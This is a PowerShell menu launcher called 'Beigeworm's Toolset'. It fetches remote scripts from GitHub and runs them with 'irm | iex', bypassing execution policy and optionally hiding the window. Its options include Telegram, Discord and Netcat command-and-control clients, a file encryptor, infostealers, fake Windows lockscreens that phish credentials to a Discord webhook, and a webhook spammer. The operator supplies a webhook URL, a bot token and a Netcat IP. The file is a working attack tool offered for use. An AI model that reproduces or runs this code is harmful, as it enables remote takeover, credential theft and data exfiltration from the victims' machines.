<#
======================================= Beigeworm's Toolset ==========================================

SYNOPSIS
All useful tools in one place.

USAGE
1. Replace the URLS and TOKENS below.
2. Run the script and follow options.

#>

$hookurl = "DISCORD_WEBHOOK_HERE"
$ghurl = "PASTEBIN_URL_HERE"
$tg = "TELEGRAM_BOT_TOKEN"
$NCurl = "YOUR_NETCAT_IP_ADDRESS" # no port
$Host.UI.RawUI.BackgroundColor = "Black"
Clear-Host
[Console]::SetWindowSize(80, 35)
[Console]::Title = "Beigeworm`'s Toolset"
$Option = ''

function Header {
cls
$Header = "==============================================================================
=   __________       .__            ___________           .__                =
=   \______   \ ____ |__| ____   ___\__    ___/___   ____ |  |   ______      =
=    |    |  _// __ \|  |/ ___\_/ __ \|    | /  _ \ /  _ \|  |  /  ___/      =
=    |    |   \  ___/|  / /_/  >  ___/|    |(  <_> |  <_> )  |__\___ \       =
=    |______  /\___  >__\___  / \___  >____| \____/ \____/|____/____  >      =
=           \/     \/  /_____/      \/                              \/       =
==============================================================================`n"
Write-Host "$header"
}

$list = "==============================================================================
=                                                                            =
= C2 Clients                               System Information                =
= 1.  Telegram C2 Client                   14. Telegram Infoscrape           =
= 2.  Discord C2 Client                    15. Discord Infoscrape            =
= 3.  NetCat C2 Client                     16. Netcat Screenshare            =
= 4.  LAN Toolset                                                            =
=                                          Console Tools                     =
= Encryption                               17. Minecraft Server Scanner      =
= 5.  Encryptor                            18. Console Task Manager          =
= 6.  Decryptor                            19. Dummy Folder Creator          =
=                                          20. Image To Console              =
= GUI Tools                                21. Matrix Cascade                =
= 7.  Filetype Finder                                                        =
= 8.  Screen Recorder                      Phishing to Discord               =
= 9.  Network Enumeration                  22. Windows 10 Lockscreen         =
= 10. Microphone Muter                     23. Windows 11 Lockscreen         =
= 11. Webhook Spammer                                                        =
= 12. Social Search                        Exit                              =
= 13. GDI effects                          99. Close Program                 =
=                                                                            =
==============================================================================
Choose an option "

While ($Option -ne '99'){
header
$Option = Read-Host "$list"

    if ($Option -eq '1'){$url = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1"}
    if ($Option -eq '2'){$url = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1"}
    if ($Option -eq '3'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/NC-Func.ps1"}
    if ($Option -eq '4'){$url = "https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1"}

    if ($Option -eq '5'){$url = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main/Encryption/Encryptor.ps1"}
    if ($Option -eq '6'){$url = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main/Decryption/Decryptor-GUI.ps1"}
    
    if ($Option -eq '7'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Search-Folders-For-Filetypes-GUI.ps1"}
    if ($Option -eq '8'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Record-Screen-GUI.ps1"}
    if ($Option -eq '9'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Network-Enumeration-GUI.ps1"}
    if ($Option -eq '10'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Mute-Microphone-GUI.ps1"}
    if ($Option -eq '11'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Discord-Webhook-Spammer-GUI.ps1"}
    if ($Option -eq '12'){$url = "https://github.com/beigeworm/assets/blob/main/master/Social-Search-GUI.ps1"}
    if ($Option -eq '13'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Desktop-GDI-Efects-GUI.ps1"}
    
    if ($Option -eq '14'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Telegram-InfoStealer.ps1"}
    if ($Option -eq '15'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Discord-Infostealer.ps1"}
    if ($Option -eq '16'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Desktop-Screenshare-over-Netcat.ps1"}
    
    if ($Option -eq '17'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Minecraft-Server-Scanner-and-Server-Info.ps1"}
    if ($Option -eq '18'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Console-Task-Manager.ps1"}
    if ($Option -eq '19'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Dummy-Folder-Creator.ps1"}
    if ($Option -eq '20'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Image-to-Console.ps1"}
    if ($Option -eq '21'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Matrix-Cascade-in-Powershell.ps1"}
    
    if ($Option -eq '22'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Fake-Windows-10-Lockscreen-to-Webhook.ps1"}
    if ($Option -eq '23'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Fake-Windows-11-Lockscreen-to-Webhook.ps1"}

    if ($Option -eq '99'){Write-Host "Closing Script";sleep 1; break}
    else{Write-Host "No valid option selected."}


    while ($Option -ne '99'){
        Header

            if (($Option -eq '5') -or ($Option -eq '6')){
                Header
                $danger = Read-Host "THIS IS A DANGEROUS SCRIPT - ARE YOU SURE? (Y/N)" =
            if ($danger -eq 'n'){
                break
            }

        }

        $HideURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Hide-Powershell-Console.ps1"
        if (($Option -eq '14') -or ($Option -eq '15') -or ($Option -eq '16') -or ($Option -eq '22') -or ($Option -eq '23')){
            $hidden = Read-Host "Would you like to run this in a hidden window? (Y/N)"
            If ($hidden -eq 'y'){
                Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
                break
            }
            If ($hidden -eq 'n'){
                Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
                break
            }
            else{
                Write-Host "No valid option selected"
                break  
            }
        }
        if (($Option -eq '7') -or ($Option -eq '8') -or ($Option -eq '9') -or ($Option -eq '10') -or ($Option -eq '11') -or ($Option -eq '12') -or ($Option -eq '13')){
            Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
            break
        }
        else{
            Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
            break
        }
    }

sleep 1
}
